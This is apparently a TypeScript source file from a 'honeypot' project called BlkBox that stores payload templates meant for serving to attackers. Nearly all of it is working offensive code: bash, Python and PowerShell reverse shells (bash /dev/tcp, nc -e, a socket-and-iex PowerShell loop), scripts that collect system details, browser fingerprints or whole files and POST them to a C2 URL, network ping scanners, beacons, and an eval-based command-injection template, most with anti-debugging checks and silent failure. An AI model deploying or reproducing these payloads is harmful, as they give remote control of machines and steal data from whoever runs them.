/**
 * Cookiejar Oven Module
 *
 * The "Oven" contains payload templates - pre-written code snippets that will be
 * customized with C2 configuration, obfuscated, and served to attackers.
 *
 * Each template includes C2 callback logic, error handling, and anti-debug features.
 */

import { PayloadType as PT } from "../../../lib_deno/types.ts";
import type { DoughConfig } from "../dough/mod.ts";

/**
 * Oven Templates - Collection of all payload templates
 */
export class OvenTemplates {
  /**
   * Get the appropriate template for a payload type and language
   */
  static getTemplate(config: DoughConfig): string {
    const { payloadType, targetEnvironment } = config;

    // Select template based on payload type and target environment
    switch (payloadType) {
      case PT.SystemInfo:
        return targetEnvironment.os === "windows"
          ? this.SYSTEM_INFO_POWERSHELL
          : this.SYSTEM_INFO_BASH;

      case PT.BrowserRecon:
        return this.BROWSER_RECON_JS;

      case PT.NetworkScanner:
        return targetEnvironment.detectLanguages.includes("python")
          ? this.NETWORK_SCANNER_PYTHON
          : this.NETWORK_SCANNER_BASH;

      case PT.Beacon:
        return targetEnvironment.detectLanguages.includes("javascript")
          ? this.BEACON_JS
          : this.BEACON_BASH;

      case PT.ReverseTCP:
        return targetEnvironment.os === "windows"
          ? this.REVERSE_TCP_POWERSHELL
          : this.REVERSE_TCP_BASH;

      case PT.CommandInjection:
        return this.COMMAND_INJECTION_BASH;

      case PT.FileExfiltration:
        return targetEnvironment.detectLanguages.includes("python")
          ? this.FILE_EXFILTRATION_PYTHON
          : this.FILE_EXFILTRATION_BASH;

      default:
        return this.SYSTEM_INFO_BASH;
    }
  }

  // ========================================
  // SYSTEM INFO PAYLOADS
  // ========================================

  static readonly SYSTEM_INFO_BASH = `#!/bin/bash
# System Information Collector
# BlkBox Honeypot Reconnaissance Payload

set -e

# C2 Configuration
C2_URL="{{C2_URL}}"
PAYLOAD_ID="{{PAYLOAD_ID}}"
HMAC_KEY="{{HMAC_KEY}}"

# Anti-debug: Check for common debugging tools
if [ -n "$DEBUGGER" ] || [ -n "$STRACE_PID" ] || pgrep -x "strace" > /dev/null 2>&1; then
  exit 0
fi

# Collect system information
collect_info() {
  local HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
  local OS=$(uname -a 2>/dev/null || echo "unknown")
  local USER=$(whoami 2>/dev/null || echo "unknown")
  local KERNEL=$(uname -r 2>/dev/null || echo "unknown")

  # Network interfaces
  local INTERFACES=$(ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "unavailable")

  # Running processes (top 20)
  local PROCESSES=$(ps aux 2>/dev/null | head -20 || echo "unavailable")

  # Memory info
  local MEMORY=$(free -h 2>/dev/null || echo "unavailable")

  # Disk usage
  local DISK=$(df -h 2>/dev/null || echo "unavailable")

  # Environment variables (filtered)
  local ENV_VARS=$(env | grep -v "PASS\\|KEY\\|SECRET" | head -20 || echo "unavailable")

  # Build JSON payload
  cat <<EOF
{
  "payload_id": "$PAYLOAD_ID",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "data_type": "system_info",
  "hostname": "$HOSTNAME",
  "os": "$OS",
  "kernel": "$KERNEL",
  "user": "$USER",
  "network_interfaces": "$(echo "$INTERFACES" | base64 -w0 2>/dev/null || echo "$INTERFACES" | base64)",
  "processes": "$(echo "$PROCESSES" | base64 -w0 2>/dev/null || echo "$PROCESSES" | base64)",
  "memory": "$(echo "$MEMORY" | base64 -w0 2>/dev/null || echo "$MEMORY" | base64)",
  "disk": "$(echo "$DISK" | base64 -w0 2>/dev/null || echo "$DISK" | base64)",
  "environment": "$(echo "$ENV_VARS" | base64 -w0 2>/dev/null || echo "$ENV_VARS" | base64)"
}
EOF
}

# Send data to C2
send_to_c2() {
  local DATA="$1"
  local ENDPOINT="$C2_URL/c2/callback/$PAYLOAD_ID"

  # Try curl first, fallback to wget
  if command -v curl >/dev/null 2>&1; then
    curl -X POST "$ENDPOINT" \\
      -H "Content-Type: application/json" \\
      -d "$DATA" \\
      --silent --max-time 10 \\
      --connect-timeout 5 2>/dev/null || true
  elif command -v wget >/dev/null 2>&1; then
    wget -qO- --post-data="$DATA" \\
      --header="Content-Type: application/json" \\
      --timeout=10 \\
      "$ENDPOINT" 2>/dev/null || true
  fi
}

# Main execution
main() {
  local INFO=$(collect_info)
  send_to_c2 "$INFO"
}

# Execute and cleanup
main
unset C2_URL PAYLOAD_ID HMAC_KEY
`;

  static readonly SYSTEM_INFO_POWERSHELL = `# System Information Collector - PowerShell
# BlkBox Honeypot Reconnaissance Payload

# C2 Configuration
$C2_URL = "{{C2_URL}}"
$PAYLOAD_ID = "{{PAYLOAD_ID}}"
$HMAC_KEY = "{{HMAC_KEY}}"

# Anti-debug checks
if ($PSDebugContext -or (Get-Process -Name "procmon*","wireshark*" -ErrorAction SilentlyContinue)) {
    exit
}

# Collect system information
function Collect-SystemInfo {
    $info = @{
        payload_id = $PAYLOAD_ID
        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        data_type = "system_info"
        hostname = $env:COMPUTERNAME
        os = (Get-WmiObject Win32_OperatingSystem).Caption
        version = (Get-WmiObject Win32_OperatingSystem).Version
        user = $env:USERNAME
        domain = $env:USERDOMAIN
        architecture = $env:PROCESSOR_ARCHITECTURE
        network_adapters = @()
        processes = @()
        memory_gb = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        disk_drives = @()
    }

    # Network adapters
    Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | ForEach-Object {
        $info.network_adapters += @{
            name = $_.Name
            mac = $_.MacAddress
            speed = $_.LinkSpeed
        }
    }

    # Top processes
    Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 20 | ForEach-Object {
        $info.processes += @{
            name = $_.ProcessName
            id = $_.Id
            cpu = $_.CPU
        }
    }

    # Disk drives
    Get-PSDrive -PSProvider FileSystem | ForEach-Object {
        if ($_.Used -and $_.Free) {
            $info.disk_drives += @{
                name = $_.Name
                used_gb = [math]::Round($_.Used / 1GB, 2)
                free_gb = [math]::Round($_.Free / 1GB, 2)
            }
        }
    }

    return $info | ConvertTo-Json -Depth 5
}

# Send to C2
function Send-ToC2 {
    param([string]$Data)

    try {
        $uri = "$C2_URL/c2/callback/$PAYLOAD_ID"
        Invoke-RestMethod -Uri $uri -Method Post -Body $Data -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue
    } catch {
        # Silent failure
    }
}

# Main execution
try {
    $sysInfo = Collect-SystemInfo
    Send-ToC2 -Data $sysInfo
} catch {
    # Silent failure
}

# Cleanup
Remove-Variable C2_URL, PAYLOAD_ID, HMAC_KEY -ErrorAction SilentlyContinue
`;

  // ========================================
  // BROWSER RECONNAISSANCE PAYLOADS
  // ========================================

  static readonly BROWSER_RECON_JS = `(function() {
  'use strict';

  // C2 Configuration
  const C2_URL = "{{C2_URL}}";
  const PAYLOAD_ID = "{{PAYLOAD_ID}}";
  const HMAC_KEY = "{{HMAC_KEY}}";

  // Anti-debug: Check for DevTools
  const devtools = { open: false };
  const element = new Image();
  Object.defineProperty(element, 'id', {
    get: function() {
      devtools.open = true;
      throw new Error();
    }
  });

  try {
    console.log(element);
  } catch(e) {
    if (devtools.open) return; // DevTools detected, abort
  }

  // Collect browser information
  const collectBrowserInfo = () => {
    const data = {
      payload_id: PAYLOAD_ID,
      timestamp: new Date().toISOString(),
      data_type: "browser_recon",

      // Basic info
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages || [navigator.language],
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,

      // Screen info
      screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation?.type
      },

      // Window info
      window: {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      },

      // Timezone
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),

      // Plugins
      plugins: Array.from(navigator.plugins || []).map(p => ({
        name: p.name,
        description: p.description,
        filename: p.filename
      })),

      // Media devices
      mediaDevices: navigator.mediaDevices ? true : false,

      // WebGL fingerprint
      webgl: getWebGLInfo(),

      // Canvas fingerprint
      canvas: getCanvasFingerprint(),

      // Fonts
      fonts: detectFonts(),

      // Battery (if available)
      battery: null,

      // Connection info
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      } : null,

      // Hardware concurrency
      hardwareConcurrency: navigator.hardwareConcurrency,

      // Device memory (if available)
      deviceMemory: navigator.deviceMemory,

      // Storage quota
      storage: null
    };

    return data;
  };

  // WebGL fingerprinting
  const getWebGLInfo = () => {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

      if (!gl) return null;

      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
        unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
        version: gl.getParameter(gl.VERSION),
        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
        maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
      };
    } catch (e) {
      return null;
    }
  };

  // Canvas fingerprinting
  const getCanvasFingerprint = () => {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');

      canvas.width = 200;
      canvas.height = 50;

      ctx.textBaseline = 'top';
      ctx.font = '14px "Arial"';
      ctx.textBaseline = 'alphabetic';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('BlkBox Canvas Fingerprint', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('BlkBox Canvas Fingerprint', 4, 17);

      return canvas.toDataURL();
    } catch (e) {
      return null;
    }
  };

  // Font detection
  const detectFonts = () => {
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const testFonts = [
      'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
      'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
      'Impact', 'Lucida Console', 'Tahoma'
    ];

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const detected = [];

    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';

    const getWidth = (font) => {
      ctx.font = testSize + ' ' + font;
      return ctx.measureText(testString).width;
    };

    const baseWidths = {};
    baseFonts.forEach(baseFont => {
      baseWidths[baseFont] = getWidth(baseFont);
    });

    testFonts.forEach(testFont => {
      let detected = false;
      baseFonts.forEach(baseFont => {
        const width = getWidth(\`'\${testFont}', \${baseFont}\`);
        if (width !== baseWidths[baseFont]) {
          detected = true;
        }
      });
      if (detected) {
        detected.push(testFont);
      }
    });

    return detected;
  };

  // Send data to C2
  const sendToC2 = async (data) => {
    try {
      const response = await fetch(\`\${C2_URL}/c2/callback/\${PAYLOAD_ID}\`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data),
        mode: 'no-cors',
        cache: 'no-cache'
      });
    } catch (e) {
      // Silent failure
    }
  };

  // Collect async info
  const collectAsyncInfo = async (data) => {
    // Battery status
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        data.battery = {
          charging: battery.charging,
          level: battery.level,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } catch (e) {}
    }

    // Storage quota
    if (navigator.storage && navigator.storage.estimate) {
      try {
        const estimate = await navigator.storage.estimate();
        data.storage = {
          usage: estimate.usage,
          quota: estimate.quota,
          usagePercent: ((estimate.usage / estimate.quota) * 100).toFixed(2)
        };
      } catch (e) {}
    }

    return data;
  };

  // Main execution
  (async () => {
    try {
      let data = collectBrowserInfo();
      data = await collectAsyncInfo(data);
      await sendToC2(data);
    } catch (e) {
      // Silent failure
    }
  })();
})();`;

  // ========================================
  // NETWORK SCANNER PAYLOADS
  // ========================================

  static readonly NETWORK_SCANNER_BASH = `#!/bin/bash
# Network Scanner - Bash
# BlkBox Honeypot Network Reconnaissance Payload

C2_URL="{{C2_URL}}"
PAYLOAD_ID="{{PAYLOAD_ID}}"
SCAN_CIDR="{{SCAN_CIDR}}"

# Quick ping scan of local network
scan_network() {
  local results=()
  local base_ip=\${SCAN_CIDR%.*}

  for i in {1..254}; do
    local ip="$base_ip.$i"
    if ping -c 1 -W 1 "$ip" &>/dev/null; then
      results+=("$ip")
    fi
  done

  echo "\${results[@]}"
}

# Main execution
main() {
  local alive_hosts=$(scan_network)

  local data=$(cat <<EOF
{
  "payload_id": "$PAYLOAD_ID",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "data_type": "network_scan",
  "cidr": "$SCAN_CIDR",
  "alive_hosts": "$(echo $alive_hosts | base64 -w0 2>/dev/null || echo $alive_hosts | base64)",
  "host_count": $(echo $alive_hosts | wc -w)
}
EOF
)

  # Send to C2
  curl -X POST "$C2_URL/c2/callback/$PAYLOAD_ID" \\
    -H "Content-Type: application/json" \\
    -d "$data" --silent --max-time 10 2>/dev/null || true
}

main
`;

  static readonly NETWORK_SCANNER_PYTHON = `#!/usr/bin/env python3
"""Network Scanner - Python"""

import socket
import subprocess
import json
import urllib.request
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

C2_URL = "{{C2_URL}}"
PAYLOAD_ID = "{{PAYLOAD_ID}}"
SCAN_CIDR = "{{SCAN_CIDR}}"

def ping_host(ip):
    """Quick ping check"""
    try:
        result = subprocess.run(
            ['ping', '-c', '1', '-W', '1', ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=2
        )
        return ip if result.returncode == 0 else None
    except:
        return None

def scan_network(cidr):
    """Scan network range"""
    base_ip = '.'.join(cidr.split('.')[:3])
    ips = [f"{base_ip}.{i}" for i in range(1, 255)]

    alive_hosts = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        results = executor.map(ping_host, ips)
        alive_hosts = [ip for ip in results if ip]

    return alive_hosts

def send_to_c2(data):
    """Send data to C2 server"""
    try:
        req = urllib.request.Request(
            f"{C2_URL}/c2/callback/{PAYLOAD_ID}",
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        urllib.request.urlopen(req, timeout=10)
    except:
        pass

def main():
    alive_hosts = scan_network(SCAN_CIDR)

    data = {
        'payload_id': PAYLOAD_ID,
        'timestamp': datetime.utcnow().isoformat() + 'Z',
        'data_type': 'network_scan',
        'cidr': SCAN_CIDR,
        'alive_hosts': alive_hosts,
        'host_count': len(alive_hosts)
    }

    send_to_c2(data)

if __name__ == '__main__':
    main()
`;

  // ========================================
  // BEACON PAYLOADS
  // ========================================

  static readonly BEACON_JS = `(function() {
  const C2_URL = "{{C2_URL}}";
  const PAYLOAD_ID = "{{PAYLOAD_ID}}";
  const INTERVAL_MS = 60000; // 1 minute

  let beaconCount = 0;
  const maxBeacons = {{MAX_CALLBACKS}};

  const sendBeacon = () => {
    if (beaconCount >= maxBeacons) {
      clearInterval(beaconInterval);
      return;
    }

    const data = {
      payload_id: PAYLOAD_ID,
      timestamp: new Date().toISOString(),
      beacon_count: ++beaconCount,
      url: window.location.href,
      referrer: document.referrer
    };

    fetch(\`\${C2_URL}/c2/heartbeat/\${PAYLOAD_ID}\`, {
      method: 'POST',
      body: JSON.stringify(data),
      mode: 'no-cors'
    }).catch(() => {});
  };

  const beaconInterval = setInterval(sendBeacon, INTERVAL_MS);
  sendBeacon(); // Send first beacon immediately
})();`;

  static readonly BEACON_BASH = `#!/bin/bash
C2_URL="{{C2_URL}}"
PAYLOAD_ID="{{PAYLOAD_ID}}"
INTERVAL=60
MAX_BEACONS={{MAX_CALLBACKS}}

count=0
while [ $count -lt $MAX_BEACONS ]; do
  ((count++))

  data='{"payload_id":"'$PAYLOAD_ID'","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'","beacon_count":'$count'}'

  curl -X POST "$C2_URL/c2/heartbeat/$PAYLOAD_ID" \\
    -d "$data" --silent --max-time 5 2>/dev/null || true

  sleep $INTERVAL
done
`;

  // ========================================
  // REVERSE TCP PAYLOADS
  // ========================================

  static readonly REVERSE_TCP_BASH = `#!/bin/bash
# Reverse TCP Shell - Bash
C2_HOST="{{C2_HOST}}"
C2_PORT="{{C2_PORT}}"

bash -i >& /dev/tcp/$C2_HOST/$C2_PORT 0>&1 2>&1 || \\
nc $C2_HOST $C2_PORT -e /bin/bash 2>/dev/null || \\
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$C2_HOST',$C2_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" 2>/dev/null
`;

  static readonly REVERSE_TCP_POWERSHELL = `# Reverse TCP Shell - PowerShell
$C2_HOST = "{{C2_HOST}}"
$C2_PORT = {{C2_PORT}}

$client = New-Object System.Net.Sockets.TCPClient($C2_HOST,$C2_PORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
`;

  // ========================================
  // COMMAND INJECTION PAYLOADS
  // ========================================

  static readonly COMMAND_INJECTION_BASH = `#!/bin/bash
# Command Injection Verification Payload
C2_URL="{{C2_URL}}"
PAYLOAD_ID="{{PAYLOAD_ID}}"

# Test if command injection is actually possible
test_injection() {
  local result=$(eval "{{INJECTION_TEST}}" 2>&1)
  echo "$result"
}

# Report back
result=$(test_injection)
data='{"payload_id":"'$PAYLOAD_ID'","data_type":"injection_test","result":"'$(echo "$result" | base64 -w0)'","success":true}'

curl -X POST "$C2_URL/c2/callback/$PAYLOAD_ID" -d "$data" --silent 2>/dev/null || true
`;

  // ========================================
  // FILE EXFILTRATION PAYLOADS
  // ========================================

  static readonly FILE_EXFILTRATION_BASH = `#!/bin/bash
# File Exfiltration - Bash
C2_URL="{{C2_URL}}"
PAYLOAD_ID="{{PAYLOAD_ID}}"
TARGET_PATHS=({{TARGET_PATHS}})

for path in "\${TARGET_PATHS[@]}"; do
  if [ -f "$path" ] && [ -r "$path" ]; then
    content=$(cat "$path" 2>/dev/null | base64 -w0)
    data='{"payload_id":"'$PAYLOAD_ID'","file":"'$path'","content":"'$content'"}'

    curl -X POST "$C2_URL/c2/callback/$PAYLOAD_ID" \\
      -d "$data" --silent --max-time 30 2>/dev/null || true
  fi
done
`;

  static readonly FILE_EXFILTRATION_PYTHON = `#!/usr/bin/env python3
import os
import base64
import json
import urllib.request

C2_URL = "{{C2_URL}}"
PAYLOAD_ID = "{{PAYLOAD_ID}}"
TARGET_PATHS = {{TARGET_PATHS_JSON}}

for path in TARGET_PATHS:
    try:
        if os.path.isfile(path) and os.access(path, os.R_OK):
            with open(path, 'rb') as f:
                content = base64.b64encode(f.read()).decode()

            data = {
                'payload_id': PAYLOAD_ID,
                'file': path,
                'content': content
            }

            req = urllib.request.Request(
                f"{C2_URL}/c2/callback/{PAYLOAD_ID}",
                data=json.dumps(data).encode(),
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=30)
    except:
        pass
`;
}
